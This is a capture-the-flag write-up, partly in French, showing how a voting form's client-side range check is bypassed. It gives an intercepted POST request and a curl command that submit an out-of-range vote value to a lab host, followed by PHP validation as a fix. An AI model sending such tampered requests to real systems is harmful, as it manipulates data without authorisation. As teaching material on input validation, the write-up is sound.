# Write-Up: Vote Manipulation Exploit

## Exploit Overview

The vulnerability exploited here relates to insufficient server-side validation in a voting system. Although the client-side enforces a voting range of 1 to 10, the server does not verify these constraints, allowing arbitrary values to be submitted.

### Steps to Exploit

#### 1. Initial Observation

- Through the browser, users interact with a voting form that allows them to assign a score (1 to 10) to different topics.
- Client-side validation restricts the input to a range between 1 and 10.

#### 2. Interception and Request Modification

- Using an interception tool like Burp Suite, we capture the POST request sent when a vote is submitted:

```
POST /?page=survey HTTP/1.1
Host: 192.168.1.33
Content-Length: 16
Content-Type: application/x-www-form-urlencoded

sujet=2&valeur=2
```

- In the body of the request, the parameter `valeur=2` specifies the vote value. This value is changed to an exaggerated number, such as `100000000000`.

#### 2BIS. Interception et modification de la requête avec CURL

Plutôt que d'utiliser un outil comme Burp Suite, on peut soumettre une requête POST directement avec **cURL** pour modifier la valeur.

La commande suivante reproduit l'exploitation :

```bash
curl -X POST "http://192.168.1.33/?page=survey" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "sujet=2&valeur=100000000000"
```

### Explication des paramètres :

- **`-X POST`** : Spécifie que la requête est de type POST.

- **`-H "Content-Type: application/x-www-form-urlencoded"`** : Définit l'en-tête `Content-Type` pour indiquer le type de données envoyées.

- **`--data "sujet=2&valeur=100000000000"`** : Indique les données à envoyer, ici `sujet=2` et une valeur hors limites `valeur=100000000000`.

#### 3. Send to the server

- After modifying the request, we submit it to the server.

- Due to the lack of server-side validation, the server accepts the invalid value and processes the vote.

#### 4. Obtaining the Flag

- Upon processing the manipulated request, the server generates and returns the flag.

## Vulnerability Description

The root cause of this vulnerability is the absence of proper server-side validation for input parameters. While the client-side enforces constraints, these can be bypassed by directly interacting with the HTTP request.

### Key Points

- **Client-Side Validation Bypass:** Client-side validation can be easily circumvented by modifying HTTP requests.
- **Lack of Server-Side Validation:** The server should enforce constraints to ensure the validity of submitted data.
- **Impact:** By submitting out-of-range values, users can manipulate the voting system and potentially access unauthorized functionality or data.

## Mitigation Strategies

To prevent this type of exploit, implement the following measures:

### 1. Server-Side Validation

Ensure all input parameters are validated on the server side. For example, in PHP:

```php
if ($valeur < 1 || $valeur > 10) {
    die("Valeur invalide !");
}
```

### 2. Input Sanitization

Sanitize and validate all incoming data to ensure it adheres to the expected format and range.

